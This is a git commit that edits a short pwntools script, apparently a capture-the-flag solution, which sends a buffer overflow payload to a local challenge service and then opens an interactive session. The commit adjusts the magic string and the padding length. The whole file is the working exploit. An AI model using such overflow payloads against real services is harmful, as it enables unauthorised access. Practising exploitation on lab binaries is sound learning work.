1fed7524ecf953616159c97537b562630422148b
Kartik-Sama <44060484+Kartik-Sama@users.noreply.github.com>
2020-06-19 21:58:00 +0530

    Update solution1.py

--- bin/bin2/solution1.py
+++ bin/bin2/solution1.py
@@ -1,6 +1,6 @@
 from pwn import *
 r = remote('localhost',6702)
 #r = process('./screening')
-payload = b'A'*128 + b'Keys!\0' + b'A'*10 + p64(1)
+payload = b'A'*128 + b'Keys\0' + b'A'*11 + p64(1)
 r.sendline(payload)
 r.interactive()
